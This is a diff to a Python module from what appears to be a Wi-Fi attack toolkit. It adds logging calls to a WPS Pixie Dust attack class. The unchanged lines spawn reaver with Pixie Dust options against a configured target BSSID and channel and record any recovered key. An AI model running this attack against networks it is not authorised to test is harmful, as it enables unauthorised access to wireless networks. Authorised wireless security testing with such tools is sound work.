@@ -8,6 +8,7 @@ import src.settings as settings
 
 from poormanslogging import info, warn, error
 from src.attacks.base_attack import BaseAttack
+import src.utils.report as report
 
 class wps_pixiedust(BaseAttack):
 	def __init__(self, p):
@@ -15,6 +16,7 @@ class wps_pixiedust(BaseAttack):
 
 	def run(self):
 		info("Running Pixie Dust attack...")
+		report.saveLog("Running Pixie Dust attack...")
 		cmd_reaver = pexpect.spawn(
 			'reaver -i {0} -c {1} -b {2} -vv -K 1'.format(settings.INTERFACE_MON, settings.TARGET_CHANNEL, settings.TARGET_BSSID))
 		cmd_reaver.logfile = open(settings.LOG_FILE, 'wb')
@@ -32,6 +34,7 @@ class wps_pixiedust(BaseAttack):
 		os.remove(settings.LOG_FILE)
 		if settings.TARGET_KEY is None:
 			warn("Pixie Dust attack failed!")
+			report.saveLog("Pixie Dust attack failed!")
 	
 	def setup(self):
 		pass
@@ -41,5 +44,6 @@ class wps_pixiedust(BaseAttack):
 		for d in deps:
 			if subprocess.call(["which", d],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
 				error("Required binary for {bin} not found.".format(bin=d))
+				report.saveLog("Required binary for {bin} not found.".format(bin=d))
 				return False
 		return True
